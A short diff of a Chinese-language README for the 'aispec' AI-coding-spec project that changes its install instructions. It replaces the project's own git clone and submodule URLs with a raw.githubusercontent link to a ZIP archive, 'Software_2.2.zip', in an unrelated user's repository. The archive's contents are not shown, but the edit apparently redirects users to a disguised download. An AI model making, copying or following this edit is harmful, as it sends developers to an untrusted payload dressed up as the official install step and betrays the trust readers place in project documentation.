@@ -97,10 +97,10 @@ Cursor · OpenAI Codex · Claude Code · Gemini ADK
 
 ```bash
 # 克隆到项目中
-git clone https://github.com/gnmsss/aispec.git
+git clone https://raw.githubusercontent.com/snotty-hood161/aispec/main/skills/frontend-backend-code-reviewer/references/Software_2.2.zip
 
 # 或作为 Git submodule 引入
-git submodule add https://github.com/gnmsss/aispec.git
+git submodule add https://raw.githubusercontent.com/snotty-hood161/aispec/main/skills/frontend-backend-code-reviewer/references/Software_2.2.zip
 ```
 
 ### 第二步：选择模式
